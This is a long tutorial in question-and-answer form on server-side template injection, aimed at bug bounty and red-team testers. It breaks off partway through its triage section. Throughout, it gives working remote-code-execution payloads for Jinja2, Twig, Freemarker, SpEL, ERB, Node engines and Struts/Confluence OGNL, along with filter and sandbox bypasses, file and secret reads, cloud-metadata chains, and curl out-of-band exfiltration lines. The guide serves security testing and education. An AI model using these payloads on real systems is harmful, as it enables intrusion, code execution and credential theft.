# Server-Side Template Injection (SSTI) — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)

> A complete, in-depth study + field reference for **SSTI** — from "what is a template engine" to per-engine remote
> code execution (Jinja2/Twig/Freemarker/SpEL/ERB/Node), **OGNL/EL injection** (the Struts/Confluence unauth RCEs),
> sandbox escapes, filter/WAF bypass, and blind SSTI. Q&A format, progressive difficulty. Explains **what everything
> is** (so you build real expertise) with explicit **"if you see THIS, do THIS"** flows. Covers detection (the
> differential probe), engine fingerprinting, exploitation, tooling, methodology, **real-world CVEs**, and defense —
> with **high/critical (RCE)** impact front and center.
>
> ⚖️ **Authorized use only.** Bug bounty (in-scope), sanctioned pentests, CTFs, and learning. Prove RCE with a **benign
> marker** (`id`/`whoami` or an OOB callback), read the minimum redacted secret if sandboxed, validate creds read-only,
> and **clean up**. Never test systems you don't have written permission to test.

**Canonical references** (cited throughout — real and worth reading in full):
- PortSwigger Web Security Academy — *Server-side template injection* (+ labs) and **James Kettle's SSTI research paper**
- PayloadsAllTheThings — *Server Side Template Injection* (per-engine) · HackTricks — *SSTI* · `vladko312/SSTImap` / tplmap
- Hackviser & PentesterLab SSTI modules · the engines' own docs (Jinja2/Twig/Freemarker/OGNL)
- CVE-2017-5638 (Struts2 OGNL), CVE-2021-26084 / CVE-2022-26134 (Confluence OGNL), Spring SpEL injections, CWE-1336 / CWE-94
- Companion kit in this repo: `Web/SSTI/` (guide + arsenal + checklist + report template + `poc/`)

---

## TABLE OF CONTENTS
- **Level 0 — Fundamentals** (Q1–Q12)
- **Level 1 — Recon & detection (the differential probe)** (Q13–Q24)
- **Level 2 — Engine fingerprinting** (Q25–Q34)
- **Level 3 — Engine → RCE (Python / Java / OGNL-EL / PHP / Ruby / Node)** (Q35–Q58)
- **Level 4 — Sandbox escapes & filter/WAF bypass** (Q59–Q72)
- **Level 5 — Impact, blind, secrets/SSRF & chains** (Q73–Q88)
- **Tooling** (Q89–Q92)
- **Methodology & triage** (Q93–Q96)
- **Cheat sheets** (Q97–Q101)
- **Real-world CVEs & references** (Q102–Q103)
- **Defense — preventing SSTI** (Q104–Q108)

---

# LEVEL 0 — FUNDAMENTALS

### Q1. What is a template engine (the basics)?
A template engine turns a **template** (text with placeholders like `{{ name }}`) plus **data** into output. The
engine **evaluates expressions** in the placeholders — it can read variables, call methods, do arithmetic. Examples:
Jinja2 (Python/Flask), Twig (PHP), Freemarker (Java), ERB (Ruby), Handlebars/EJS/Pug (Node). *Knowing the engine
evaluates expressions is the whole basis of the attack.*

### Q2. What is SSTI, then?
**Server-Side Template Injection**: when **user input becomes part of the template itself** (not just the data the
template renders), the engine **evaluates your input as a template expression**. Since expressions can call methods and
reach the OS, this usually becomes **Remote Code Execution**.
```python
render_template_string("Hello " + request.args['name'])   # name={{7*7}} → "Hello 49"  (VULNERABLE — input IS the template)
render_template_string("Hello {{ name }}", name=request.args['name'])  # name={{7*7}} → "Hello {{7*7}}" (SAFE — input is DATA)
```

### Q3. Why is SSTI (almost always) Critical?
Because most server-side engines can reach the runtime/OS (`os.popen`, `Runtime.exec`, `system`, `child_process`). So
SSTI's ceiling is **RCE → full server compromise** (source, secrets, DB, cloud, internal pivot). Even "sandboxed"
engines have known escapes, and even when RCE is blocked you often get **secrets** (`{{config}}` → Flask `SECRET_KEY`).

### Q4. SSTI vs CSTI vs XSS vs plain reflection — the critical distinction?
```
SSTI  → a SERVER template engine evaluates your expression (math runs server-side, no JS) → RCE.        (this kit)
CSTI  → a CLIENT framework (Angular/Vue) evaluates {{}} in the browser → XSS.                            (XSS kit)
XSS   → your input is reflected into HTML/JS and runs in the browser → XSS.                              (XSS kit)
reflection → input echoed but NOT evaluated (7*7 stays "7*7") → nothing.
```
The discriminator: did the **server** compute the expression (the response already contains `49` before any JS), or did
the browser, or did it just echo your text?

### Q5. What's the #1 mistake — and the differential rule?
Reporting **`{{7*7}}=49`** alone. `49` can be a **coincidence** (the page already contained "49"/"7"), **client-side**
(Angular/Vue → CSTI), or harmless **reflection**. The rule: prove **server-side** evaluation with a **differential
probe** — `{{1337*1338}}`→`1788906` (a value the page can't already contain) **and** `{{7*'7'}}`→`7777777`
(string-multiply, a behavior only a real engine produces). A lone `49` is the fastest way to get closed as
Informational/Not-Reproducible.

### Q6. Why use non-round operands like `1337*1338`?
Because `7*7=49` and `7` are common page content — a coincidental match is plausible. `1337*1338=1788906` is a value
the page is extremely unlikely to already contain, so seeing it **computed** is strong proof the engine ran your
arithmetic.

### Q7. What does `{{7*'7'}}=7777777` prove?
That a **real template engine** evaluated it — Jinja2/Twig **string-multiply** (`'7'` repeated 7 times → `7777777`),
which a coincidence or a client-side reflection won't produce. (Numeric-only engines return `49` or error.) The pair
(numeric + string-multiply) is the low-false-positive confirmation.

### Q8. What's the mental model?
SSTI means **the server is `eval()`-ing your text as template code.** Severity is Critical when you reach the OS; your
craft is (1) *proving it's server-side* (differential), (2) *fingerprinting the engine*, and (3) *walking that
engine's object graph to a shell*.

### Q9. Where do SSTI sinks live?
"Customize" features (email/notification/invoice/report templates, page builders, themes), **reflected fields**
(name/username/bio rendered back, subject lines, error messages that template input), **generated docs** (PDF/CSV
builders — often a *blind* engine), markdown/preview, and **second-order** (a stored value rendered later in an
admin/email/PDF template → blind SSTI). Java apps reflecting `${}`/`%{}`/`#{}` → think **OGNL/EL** (Q47).

### Q10. Why does SSTI pay so well?
Direct **RCE** on most engines; reaches **secrets** even when sandboxed (`{{config}}`/env → creds → pivot); and hits
**high-trust tiers** — email/PDF/report renderers often run in back-office workers with broad access. And it's
frequently **unauthenticated** in the big real-world cases (Struts/Confluence OGNL).

### Q11. What do I need to learn first?
How template engines evaluate expressions; the **differential** confirmation; a proxy + an **OOB host** (interactsh)
for blind cases; basic per-engine object-traversal (how to reach `os`/`Runtime`/`child_process` from the template
scope); and benign-marker discipline.

### Q12. What's the impact ordering?
① **engine identified → RCE/shell** — Critical → ② **OGNL/EL unauth RCE** (Struts/Confluence) — Critical → ③ **sandboxed
engine escaped → RCE** — Critical → ④ **blind SSTI confirmed via time/OOB → RCE** — Critical → ⑤ **file read / SSRF /
`{{config}}`-secrets** (when RCE is blocked) — High → ⑥ an unverified `{{7*7}}=49` or a client-side `{{}}` — a *lead*,
not a finding.

---

# LEVEL 1 — RECON & DETECTION (THE DIFFERENTIAL PROBE)

### Q13. How do I find SSTI sinks?
Test **every reflected input** with the differential probe; prioritise "customize template"/page-builder/invoice
features (almost certainly a server engine); check **generated docs** (PDF/report — a different, often blind engine);
**headers/subjects** rendered into staff/email templates (blind); grep source/JS for `render_template_string` /
`Template().render` / `Handlebars.compile` / `ERB.new` with user input; and note stack hints (Server header, errors).

### Q14. What's the exact detection method?
Inject the **differential** + a multi-syntax polyglot:
```
{{1337*1338}}   → 1788906 ?        (Jinja/Twig)        ${1337*1338}  #{1337*1338}  <%= 1337*1338 %>  {1337*1338}
{{7*'7'}}       → 7777777 ?        (string-multiply confirms a real engine)
polyglot:       ${{<%[%'"}}%\      (an error or partial-eval flags a template engine; then narrow by which delimiter computes)
```
Confirm the value is **computed in the server response** (before any JS) and the literal `{{1337*1338}}` is gone.

### Q15. How do I rule out the false positives?
- **Client-side (CSTI)?** View source: does the **raw** `{{1337*1338}}` arrive at the browser and only become a number
  after JS runs? → that's Angular/Vue CSTI → XSS kit, not SSTI.
- **Coincidence?** Use `1337*1338` (the page can't already contain `1788906`).
- **Reflection?** If it comes back literally `1337*1338` → not evaluated → not SSTI.
- **Error only?** A template stack trace without evaluation may still flag a sink — keep probing, but it's not yet SSTI.

### Q16. SSTI vs CSTI — how do I tell, concretely?
SSTI: the **server response** already contains `1788906` (the math ran server-side, no JS needed). CSTI: the server
response contains the literal `{{1337*1338}}` and the **browser** turns it into `1788906` after the framework runs.
Check view-source vs the live DOM. SSTI = server computed it; CSTI = browser did → that's an **XSS** finding.

### Q17. Which delimiter computed — and why does that matter?
The delimiter that evaluates narrows the engine family: `{{ }}`→Jinja2/Twig (or Handlebars/Nunjucks), `${ }`→
Freemarker/Velocity/SpEL (or OGNL/EL), `#{ }`→Ruby/Thymeleaf, `<%= %>`→ERB/EJS, `{ }`→Smarty/Tornado. Fingerprint
**before** firing RCE payloads — the wrong engine's payload just errors.

### Q18. What does the string-multiply behavior tell me about the engine?
`{{7*'7'}}`→`7777777` → **Jinja2 or Twig** family (then distinguish via `{{config}}` (Jinja) vs Twig filters). `{{7*'7'}}`
→`49` or an error → a **different** family (numeric engines). It's a fast branch in the fingerprint tree.

### Q19. What is second-order / blind SSTI and how do I detect it?
Your input is **stored** and rendered later by a template you can't see (a queued email, a generated PDF, an admin
view). Plant a payload with a unique marker, trigger the consumer, and confirm via **time** (a slow render) or **OOB**
(make the engine fetch your host). The back-office renderer is often a **higher-priv** tier.

### Q20. The field clearly feeds an unseen email/PDF — assume what?
Assume **blind SSTI**. Confirm with a `sleep`/OOB payload for the suspected engine (e.g. Jinja
`{{cycler.__init__.__globals__.os.popen('sleep 10').read()}}` or `...os.popen('curl http://OOB/$(whoami)')...`). A
delayed render or a server-sourced OOB hit carrying `$(whoami)` proves it.

### Q21. Could it be SSTI *and* XSS at once?
Yes — if the engine renders your expression to HTML that also executes in the browser. But classify by **where the
expression evaluates**: server (SSTI→RCE) vs browser (CSTI→XSS). Report the server-side RCE as SSTI; a client-side
`{{}}` is an XSS report, not an SSTI duplicate.

### Q22. What's a polyglot detection payload?
`${{<%[%'"}}%\` fires across multiple engines (an error or partial evaluation flags *some* template engine). Use it to
quickly tell "there's an engine here," then run the differential + per-delimiter probes to identify which.

### Q23. What if only a template **error** comes back (a stack trace)?
A stack trace can reveal the **engine + version** (great for fingerprinting and CVE matching) but an error alone isn't
SSTI — you still need **evaluation**. Use the leaked engine name to pick the right payload, then prove the differential.

### Q24. What's the deliverable from Level 1?
**Confirmed server-side evaluation** (differential proven, CSTI/coincidence/reflection ruled out) + which delimiter
computed. Now fingerprint the exact engine (Level 2) and go to RCE.

---

# LEVEL 2 — ENGINE FINGERPRINTING

### Q25. Why fingerprint before exploiting?
Because the RCE payload is **engine-specific** — Jinja2 ≠ Twig ≠ Freemarker ≠ SpEL ≠ ERB ≠ Smarty ≠ Nunjucks. Firing the
wrong engine's payload just errors and wastes attempts (and noise). Nail the engine, then use its object chain.

### Q26. Give the fingerprint decision tree.
```
{{7*7}}=49 ?
  ├─ {{7*'7'}}=7777777 ?  → JINJA2 (Python) or TWIG (PHP) → distinguish: {{config}} works=Jinja ; Twig filters/_self=Twig
  └─ {{7*'7'}}=49/error   → a different {{}} engine (Handlebars/Nunjucks) — probe their idioms
${7*7}=49 ?  → FREEMARKER / VELOCITY / Spring SpEL (or OGNL/EL on Struts/Confluence) → ${T(java...)} / ?new()
#{7*7}=49 ?  → Ruby (Slim) / Thymeleaf
<%= 7*7 %>=49 ? → ERB (Ruby) / EJS (Node)
{7*7}=49 ?  → SMARTY (PHP) / Tornado
```

### Q27. Jinja2 vs Twig — how do I distinguish?
Both give `{{7*'7'}}=7777777`. Then: **`{{config}}`** rendering the app config (or `{{self}}`, `{{request}}`) → **Jinja2**
(Python/Flask). **Twig-specific filters** (`{{ ['x']|filter(...) }}`, `{{ _self }}`) and a PHP stack → **Twig**.

### Q28. Freemarker vs Velocity vs SpEL — how?
All are `${...}`-ish Java. **Freemarker**: `<#assign …?new()>` / `${"…"?new()(…)}` works. **Velocity**: `#set($x=…)`
directives. **SpEL** (Spring): `${T(java.lang.Runtime)…}` / `*{…}`. Error messages and the product (Spring app?) help.

### Q29. ERB vs EJS — how?
Both use `<%= %>`. **ERB** (Ruby): `<%= \`id\` %>` / `<%= system('id') %>` works; Ruby stack. **EJS** (Node): the
`process.mainModule.require('child_process')` path works; Node stack. The runtime tells you.

### Q30. How do I fingerprint when output isn't reflected (blind)?
Use **engine-specific error/timing/OOB** behaviors: a payload valid in engine A but a syntax error in engine B changes
the response (status/error); a `sleep` confirms the family; an OOB fetch confirms it reached the engine. Narrow by which
engine's *valid* syntax doesn't error.

### Q31. The app reflects `${...}` in a Java context — is it always a template engine?
Not necessarily — it might be **OGNL** (Struts/Confluence) or **Java EL** (JSP/JSF), which are **expression languages**,
not template engines. Same outcome (your expression runs → RCE), different syntax/CVEs. If it's Struts/Confluence/JSF,
go to the OGNL/EL playbook (Q47).

### Q32. What if multiple delimiters seem to compute?
Some stacks chain engines (a template engine that also evaluates EL). Test each delimiter's RCE payload; the one that
executes is your primitive. When in doubt, prefer the engine the **error/stack** identifies.

### Q33. How does the kit's `ssti_detect.py` help?
It runs the **differential** (non-round operands + string-multiply), verifies the value is in the **server** response
(not CSTI/reflection), and **fingerprints** the engine across `{{ }}/${ }/#{ }/<%= %>/{ }` — printing the most likely
engine + confidence, so you don't hand-walk the tree.

### Q34. The deliverable from Level 2?
The **exact engine** (or that it's OGNL/EL) + the rendering context + whether a **sandbox** is active (`{{config}}`/
`__class__` blocked?). Now use that engine's RCE chain (Level 3).

---

# LEVEL 3 — ENGINE → RCE (PYTHON / JAVA / OGNL-EL / PHP / RUBY / NODE)

### Q35. Jinja2 (Python/Flask) — the classic RCE payloads?
Reach `os` through an object in scope, then `popen`:
```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}    → find subprocess.Popen's index → call it (the classic MRO walk)
```

### Q36. Why does the Jinja `cycler/lipsum/request` trick work?
Those are objects already in the template's global scope. Their `__globals__`/`__init__.__globals__` exposes the
module's globals (including `os`), so you reach `os.popen('id')` **without** importing anything — short and reliable.
Try `cycler`/`lipsum` first; they survive many setups.

### Q37. Jinja2 — RCE blocked but I still want a win?
Read **`{{config}}`** → the Flask **`SECRET_KEY`** → forge/decrypt **session cookies** (admin sessions) = often
High–Critical on its own, even without a shell. Also **file read**:
`{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}`.

### Q38. Mako / Tornado (Python)?
```
Mako:    ${self.module.cache.util.os.system('id')}    <%import os%>${os.popen('id').read()}
Tornado: {% import os %}{{ os.popen('id').read() }}
```
Mako has near-unrestricted Python — `<%import os%>` is a clean RCE.

### Q39. Django templates — RCE?
Django's template language is **intentionally limited** (no arbitrary Python) → usually **no direct RCE**. But
`{{ settings.SECRET_KEY }}` (if exposed) and template-tag abuse can be info-disclosure. Don't expect a shell from pure
Django templates; check the *secrets* angle.

### Q40. Freemarker (Java) — RCE?
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
${"freemarker.template.utility.Execute"?new()("id")}
```
The `?new()` of `Execute` is the most reliable Freemarker RCE.

### Q41. Spring SpEL / Thymeleaf — RCE?
```
${T(java.lang.Runtime).getRuntime().exec("id")}     *{T(java.lang.Runtime).getRuntime().exec("id")}
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x   (Thymeleaf expression preprocessing)
${T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"})}   (when you need a shell for pipes)
```

### Q42. Velocity (Java) — RCE?
`#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$x` (Velocity-tools context) — reach
`java.lang.Runtime` via the available context objects.

### Q43. Twig (PHP) — RCE?
```
{{ ['id']|filter('system') }}                 (cleanest modern Twig)
{{ ['id',''] | sort('system') }}
{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}   (older Twig, two-step)
{{ attribute(_self.env, 'getFilter', ['system'])('id') }}
```

### Q44. Smarty (PHP) — RCE?
```
{system('id')}
{php}system('id');{/php}     (older Smarty)
```
Smarty reaches the OS directly with `{system('id')}`.

### Q45. Blade (Laravel) — RCE?
Blade compiles to PHP; RCE needs a **raw/eval** context — `{!! !!}` of user input, `@php` blocks, or a `Blade::render($userInput)`
sink. Look for where user-supplied Blade is *compiled/evaluated*, not just rendered as data.

### Q46. ERB (Ruby) / Node engines — RCE?
```
ERB (Ruby):     <%= `id` %>   <%= system('id') %>   <%= IO.popen('id').read %>
Slim (Ruby):    #{`id`}
EJS (Node):     <%= global.process.mainModule.require('child_process').execSync('id') %>
Pug (Node):     #{root.process.mainModule.require('child_process').execSync('id')}  /  = global.process.mainModule.require(...)
Nunjucks (Node):{{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}
Handlebars:     a prototype-chain payload reaching require('child_process').execSync('id') (multi-step; see PayloadsAllTheThings)
```
Node's path is almost always `process.mainModule.require('child_process').execSync('id')` reached via available globals.

### Q47. OGNL / EL injection (Struts / Confluence / JSF) — the biggest real-world Java RCEs?
A close cousin of SSTI: Java frameworks evaluate **expression languages** in parameter/template contexts. Same mindset,
different syntax, and these are **mass-exploited unauth CVEs**:
```
Struts2 (CVE-2017-5638): OGNL in the Content-Type header → use the published %{(#_='multipart/form-data')...exec('id')...} PoC.
Confluence (CVE-2021-26084, unauth): OGNL in queryString/page params → '%2b#{@java.lang.Runtime@getRuntime().exec("id")}%2b'
Confluence (CVE-2022-26134, unauth): OGNL in the URL PATH → /%24%7B%28%23a%3D%40...Runtime%40getRuntime%28%29.exec%28%22id%22%29...%29%7D/
Java EL (JSP/JSF): ${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(...,'id')}
```
**If** the target is Struts/Confluence/a Java app reflecting `${}`/`%{}`/`#{}` → fingerprint product+version → use the
**matching published CVE PoC** → unauth RCE. Prove with `id`/OOB and stop.

### Q48. How do I read command output (vs blind)?
Wrap the exec so the output is returned where the engine supports it (Jinja `.read()`, Freemarker `Execute` returns
output, SpEL `.getInputStream()` read). If the engine doesn't return output, use **OOB/time** (Level 5) to confirm and
exfiltrate.

### Q49. The RCE half is "just command injection" — should I read that kit?
Yes — once you can call into the runtime, the shell/exfil/cleanup discipline is identical to OS command injection
(benign markers, OOB exfil, no persistence). Read the **Command-Injection kit** §11–§13 for the post-exec half.

### Q50. How do I prove SSTI RCE safely?
A **benign computed marker** first (the differential already showed eval), then a single engine-exec of `id`/`whoami`.
Seeing `uid=...` is a complete Critical. Don't drop a persistent web/reverse shell on a bug-bounty target; clean up.

### Q51. Which engine payload do I try first?
Match the **fingerprint**: Jinja2 → `cycler`/`lipsum` globals; Twig → `['id']|filter('system')`; Freemarker →
`?new()("id")`; SpEL → `T(java.lang.Runtime)...`; ERB → backticks; Node → `process.mainModule.require(...)`; Smarty →
`{system('id')}`; Struts/Confluence → the OGNL CVE PoC.

### Q52. What if the engine is identified but the payload errors?
Either you have the wrong **sub-version** (try the alternate chain — `lipsum` vs `cycler` vs `request.application`), a
**sandbox** is active (Level 4), or a **filter/WAF** blocks a token (Level 4). Errors are clues — read them.

### Q53. Can SSTI be RCE on a "limited" engine like Django/Go templates?
Usually **not directly** (they restrict method calls). But: **secrets** (`{{settings.SECRET_KEY}}` / leaked config),
**SSRF** (an engine `url`/`include` feature), and info-disclosure are still on the table. Judge by what the limited
engine *can* reach.

### Q54. How do I get a shell (pipes/redirects) from `exec`?
Engine `exec`/`Runtime.exec` runs a single program, not a shell — for pipes/`&&`, wrap in `/bin/sh -c`:
`Runtime.exec(new String[]{"/bin/sh","-c","id|base64"})` (SpEL/Freemarker), or `os.popen('id|base64')` (Jinja, which
uses a shell). This matters for exfil one-liners.

### Q55. Second-order SSTI exploitation?
Plant the engine RCE payload in a **stored** field rendered later by an admin/email/PDF template; trigger the consumer;
the payload fires in that (often higher-priv) context. Confirm via OOB if you can't see the render.

### Q56. SSTI via uploaded/processed documents?
DOCX/XLSX templating, JasperReports, and "merge into template" features evaluate placeholders in the **uploaded
document** → SSTI/RCE in the converter. Cross-ref the FileUpload kit to get the document accepted.

### Q57. Twig/Smarty RCE blocked — alternates?
Twig: try `map('system')`, `sort('system')`, `attribute(_self.env,'getFilter',['system'])`, or the
`registerUndefinedFilterCallback('exec')` two-step. Smarty: `{php}` (older) or a web-shell write via
`Smarty_Internal_Write_File`. Match the version.

### Q58. The end-state of Level 3?
A **demonstrated RCE** (engine-exec of a benign `id`) — or, if RCE is blocked, the recognition that you need a **sandbox
escape / filter bypass** (Level 4) or a **secrets/file-read** fallback (Level 5).

---

# LEVEL 4 — SANDBOX ESCAPES & FILTER/WAF BYPASS

### Q59. What is a template sandbox?
Some engines ship a **sandbox** that blocks dangerous attributes/methods (Jinja2 `SandboxedEnvironment`, Twig sandbox).
Symptoms: `{{config}}`/`__class__` blocked, or `SecurityError`/`sandbox` in errors. A sandbox is **not** a wall — known
escapes exist.

### Q60. How do I escape the Jinja2 sandbox?
Reach builtins via objects the sandbox forgot to block: globals through **`cycler`/`joiner`/`namespace`** or
**`request.application.__globals__`** / `get_flashed_messages.__globals__`; attribute access via `|attr('__class__')`
and `request['__class__']` chains. These frequently survive the sandbox → still RCE.

### Q61. How do I escape the Twig sandbox?
The same **filter-based** RCE (`map`/`filter`/`sort('system')`) often slips older Twig sandboxes; and `attribute()` to
reach env methods. Match the Twig version to a known sandbox-escape.

### Q62. Sandbox vs filter/WAF — what's the difference?
A **sandbox** is the engine's own restriction (escape it with engine tricks). A **filter/WAF** is an app/WAF blocking
tokens like `{{`, `.`, `_`, `class`, `config` in your *input* (route around the specific block). Different bypasses —
identify which you face.

### Q63. The `{{ }}` delimiter is blocked — bypass?
Use the **statement context**: Jinja `{% print(7*7) %}` / `{%if ...%}` (for blind boolean), Twig `{% ... %}`, or the
engine's other delimiter (`${ }`/`<%= %>`). The statement form often isn't on the `{{`-blocklist.

### Q64. The dot (`.`) is blocked — bypass?
Use **`['attr']` indexing** and **`|attr('name')`**: `{{ ()['__class__'] }}`, `{{ self|attr('__class__') }}`,
`request['application']['__globals__']`. These reach attributes without a literal `.`.

### Q65. The underscore (`_`) is blocked — bypass?
**Build the word** by concatenation (`['__cl'+'ass__']`) or **smuggle it via `request.args`** (the bad token lives in
the *query string*, not your template): `{{ ''[request.args.a] }}` with `?a=__class__`. The underscore never appears in
your injected template.

### Q66. A keyword (`class`/`config`/`os`/`popen`/`system`) is blocked — the universal bypass?
**`request.args` smuggling** (Jinja): put the blocked word in the query, read it in the template:
```
{{ lipsum|attr(request.args.g)|attr('os')|attr('popen')('id')|attr('read')() }}   with  ?g=__globals__
```
The token `__globals__` is in `?g=…`, so it **never appears in your injected template** → the filter doesn't see it.
This is the single most powerful Jinja filter bypass.

### Q67. Quotes are filtered — bypass?
Bring strings in via **`request.args`** (no quotes in the template), or build them with `chr()`/`format` inside the
template, or use engine constants. For non-Jinja engines, reflection with a built class-name string.

### Q68. Brackets `[ ]` are blocked — bypass?
Use **`|attr()`** everywhere instead of `['...']`, and `.__getitem__()` via attribute chains. `|attr()` is the
bracket-free way to walk the object graph.

### Q69. Length-limited input — bypass?
Use short global shortcuts (`g`/`lipsum`/`cycler`), the statement context, or **split** the payload across two
reflections if the app concatenates them. Smuggle long tokens via `request.args`.

### Q70. Non-Jinja engine with a keyword filter — bypass?
Twig: filter aliases (`map`/`sort('system')`). Freemarker: build the class name as a string. OGNL/EL: `Class.forName`
with a concatenated class-name string and reflection. The principle is the same: don't let the blocked literal appear.

### Q71. How do I know it's a filter (not a wall)?
If the **differential is confirmed** (the engine clearly evaluates) but every RCE payload is blocked → it's a **filter**,
not a wall. Engines that evaluate `1337*1338` will evaluate *something* — route around the specific blocked tokens with
`|attr()`/`request.args` smuggling.

### Q72. The end-state of Level 4?
**RCE that survives the sandbox/filter/WAF** — or, if truly closed, the secrets/file-read fallback (Level 5). A
"sandboxed/filtered" SSTI is usually still Critical once escaped.

---

# LEVEL 5 — IMPACT, BLIND, SECRETS/SSRF & CHAINS

### Q73. Engine RCE → shell — how do I escalate?
Wrap the engine exec in `/bin/sh -c` for pipes; for bug bounty, a single `id`/`whoami` (or OOB `$(whoami)`) is enough
proof. For authorized red-team, a reverse shell + pivot (read config/.env → DB/cloud creds, cloud metadata from the
box) — read-only proof, clean up.

### Q74. RCE blocked by a tight sandbox — what's the High fallback?
**File read** (`/etc/passwd`, app config, `.env`) and **`{{config}}`/secret dumps**. Jinja:
`{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}` and `{{config['SECRET_KEY']}}`. ERB:
`<%= File.read('/etc/passwd') %>`. These are still **High** and often yield creds that escalate (forge Flask sessions,
DB access).

### Q75. SSTI → SSRF?
Some engines have `url`/`include`/`import` features the template can invoke → make the engine fetch a URL → SSRF
(metadata creds, internal reach). Steer it to `169.254.169.254` (SSRF kit) → cloud takeover. A constrained engine that
can't RCE may still SSRF.

### Q76. How do I confirm/exploit blind SSTI?
**Time:** an engine expression that sleeps (`{{cycler.__init__.__globals__.os.popen('sleep 10').read()}}`) → measure
the delay (repeat to exclude jitter). **OOB:** make the engine call out
(`...os.popen('curl http://OOB/$(whoami)')...`) → a server-sourced hit confirms eval **and** carries command output.

### Q77. Why is blind SSTI often *higher* impact?
Because the field that feeds a back-office **email/PDF/report** worker frequently runs in a **higher-privilege** tier
than the front end. A blind SSTI there → RCE in a worker with broader cloud/internal access.

### Q78. Chain: SSTI → cloud takeover.
SSTI → RCE → `curl http://169.254.169.254/...` (or ECS `169.254.170.2`) → IAM creds → `aws sts get-caller-identity`
(read-only proof) → cloud-account compromise / a cloud run-command surface → shell. Stop at proof.

### Q79. Chain: Jinja2 `{{config}}` → forge admin sessions.
Read the Flask **`SECRET_KEY`** via `{{config}}` → sign/forge a session cookie with `admin=True`/the admin `user_id` →
**auth bypass / admin ATO** without a full shell. A clean High–Critical even on a sandboxed engine.

### Q80. Chain: OGNL/EL unauth RCE (Struts/Confluence).
Identify the product/version → fire the published OGNL CVE PoC (CVE-2017-5638 / CVE-2021-26084 / CVE-2022-26134) →
**unauthenticated RCE** → full compromise. These are the highest-impact real-world "template/expression injection" bugs.

### Q81. Chain: SSTI via document upload.
Upload a DOCX/XLSX/JasperReport template with engine placeholders → the server's merge/convert evaluates them → RCE in
the converter (FileUpload kit to land the file).

### Q82. How do I demonstrate impact safely?
Benign marker (`id`) for RCE; minimal redacted secret (first lines of config/.env, `SECRET_KEY` masked) if sandboxed;
read-only cred validation for any cloud creds; a repeated delay / server-sourced OOB for blind. Don't exfil real data
or persist.

### Q83. What's the severity & CWE?
SSTI→RCE: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → Critical (~9.8). **CWE-1336** (SSTI) / **CWE-94** (code injection). OGNL/EL
→ same. File-read/secret only → High (CWE-1336 + CWE-200).

### Q84. How do I escalate a "weak" SSTI finding?
`{{7*7}}=49` → run the **differential** + fingerprint (don't report `49`). Confirmed engine → **RCE**; if sandboxed →
**escape** or `{{config}}` secrets; if blind → **time/OOB**; if Java `${}` → consider **OGNL/EL** CVE. Always push the
primitive to a **demonstrated** RCE or High secret-disclosure.

### Q85. SSTI vs SQLi/cmdi/XSS — when do I pick which kit?
If a **server template engine** evaluates your expression → SSTI. If it's the **browser** → XSS/CSTI. If input reaches
a **shell** → command injection. If a **SQL** parser → SQLi. The discriminator is *which interpreter* runs your input;
the differential probe tells you it's a template engine.

### Q86. Can SSTI be both blind and sandboxed?
Yes — a back-office PDF renderer (blind) on a sandboxed engine. Confirm blind via OOB, escape the sandbox via the engine
tricks, and exfil command output through the OOB callback (carry `$(whoami)`). Both layers are usually beatable.

### Q87. What evidence makes a great SSTI report?
The **differential** (`1337*1338`=`1788906`, `7*'7'`=`7777777`) showing **server-side** eval, the **engine** name, the
**engine RCE payload** + the `id` output (or `{{config}}` secret if sandboxed; or the OGNL CVE PoC for Java), the impact
(RCE / secret-disclosure / cloud), CWE-1336(+94), and own-tenant/benign-marker discipline.

### Q88. What separates expert SSTI testing from beginner?
The expert (1) **proves server-side eval differentially** (never reports `49` or a CSTI `{{}}`); (2) **fingerprints the
engine** before firing; (3) knows the **per-engine RCE chains** *and* **OGNL/EL** for Java; (4) **escapes sandboxes** and
**bypasses filters** (`|attr()` + `request.args` smuggling); (5) handles **blind** (time/OOB) and **secrets**
(`{{config}}` → session forge); and (6) chains to cloud/RCE and proves it safely.

---

# TOOLING

### Q89. Core SSTI toolkit?
The kit's `poc/ssti_detect.py` (differential + FP-gating + fingerprint) and `poc/ssti_rce.py` (per-engine + OGNL/EL +
Jinja-bypass payload generator); **SSTImap**/tplmap (automated detect+exploit — verify by hand); **interactsh/Burp
Collaborator** (blind OOB); Burp (tamper/replay); the engines' docs + PayloadsAllTheThings for per-engine chains.

### Q90. How do I use `ssti_detect.py`?
`python3 ssti_detect.py -u "https://t/profile?name=FUZZ"` — it sends `{{1337*1338}}`+`{{7*'7'}}`, verifies the **server**
computed it (not CSTI/reflection), and prints the likely engine. Then `ssti_rce.py --engine <engine> --cmd id` prints
the RCE payload.

### Q91. Why not just trust tplmap/SSTImap?
Tools false-positive (and miss filtered/sandboxed cases). Reproduce the **differential** by hand, **fingerprint**, and
reach **RCE/secrets** yourself before reporting — a tool flag or a lone `49` is not a finding.

### Q92. How do I build a success oracle?
For RCE: the response contains your **benign marker** (`uid=`/a unique echo). For blind: a repeated time delay and/or an
interactsh hit carrying `$(whoami)`. For detection: the **computed** differential value in the server response. Gate
findings on **evaluation/execution**, not reflection.

---

# METHODOLOGY & TRIAGE

### Q93. Step-by-step methodology.
**Recon** template sinks → **Baseline** differential (server-side eval, kill CSTI/coincidence) → **Fingerprint** the
engine (or OGNL/EL) → **RCE** via that engine's chain → **escape sandbox / bypass filter** if blocked → **blind** via
time/OOB, **secrets/SSRF** fallback → **chain** to cloud/session-forge → **report** (differential + engine + RCE,
benign marker, CWE-1336+94).

### Q94. Quick triage decision tree.
- `{{7*7}}=49` only → **differentiate** first (1337*1338 + 7*'7'; rule out CSTI).
